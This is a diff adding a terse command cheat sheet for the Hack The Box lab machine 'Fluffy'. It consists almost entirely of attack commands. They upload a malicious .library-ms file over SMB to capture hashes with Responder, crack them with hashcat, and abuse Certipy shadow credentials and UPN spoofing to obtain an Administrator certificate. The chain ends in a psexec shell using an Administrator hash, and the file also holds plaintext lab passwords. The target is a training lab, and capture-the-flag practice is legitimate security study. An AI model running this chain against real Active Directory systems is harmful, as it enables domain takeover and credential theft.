@@ -1,0 +1,61 @@
+Refer to walkthrough
+
+# --- [SMB Share Enumeration] ---
+smbclient.py FLUFFY.HTB/j.fleischman:J0elTHEM4n1990!@10.129.128.135 -list
+
+# --- [Upload malicious .library-ms file to IT share] ---
+smbclient.py FLUFFY.HTB/j.fleischman:J0elTHEM4n1990!@10.129.128.135 -share IT
+put malicious.library-ms
+
+# --- [Start Responder] ---
+sudo responder -I tun0
+
+# --- [Crack p.agila Hash] ---
+hashcat -m 5600 captured_hash.txt rockyou.txt
+
+# --- [Certipy - Shadow Credential: ca_svc] ---
+certipy shadow auto \
+  -username p.agila@fluffy.htb \
+  -password 'prometheusx-303' \
+  -account ca_svc \
+  -dc-ip 10.129.128.135
+
+# --- [Certipy - Shadow Credential: winrm_svc] ---
+certipy shadow \
+  -username ca_svc@fluffy.htb \
+  -hashes :<ca_svc_hash> \
+  -account winrm_svc \
+  -dc-ip 10.129.128.135 
+
+# --- [Certipy - UPN spoofing: ca_svc → Administrator] ---
+certipy account update \
+  -username ca_svc@fluffy.htb \
+  -hashes :<ca_svc_hash> \
+  -user ca_svc \
+  -upn Administrator \
+  -dc-ip 10.129.128.135
+
+# --- [Certipy - Request certificate with spoofed UPN] ---
+certipy req \
+  -username ca_svc@fluffy.htb \
+  -hashes :<ca_svc_hash> \
+  -template User \
+  -ca fluffy-DC01-CA \
+  -dc-ip 10.129.128.135
+
+# --- [Certipy - Revert UPN to original] ---
+certipy account update \
+  -username ca_svc@fluffy.htb \
+  -hashes :<ca_svc_hash> \
+  -user ca_svc \
+  -upn ca_svc@fluffy.htb \
+  -dc-ip 10.129.128.135
+
+# --- [Certipy - Authenticate with Administrator cert] ---
+certipy auth \
+  -pfx administrator.pfx \
+  -dc-ip 10.129.128.135 \
+  -domain fluffy.htb
+
+# --- [Impacket - Psexec shell as Administrator] ---
+psexec.py FLUFFY.HTB/administrator@10.129.128.135 -hashes :8da83a3fa618b6e3a00e93f676c92a6e 
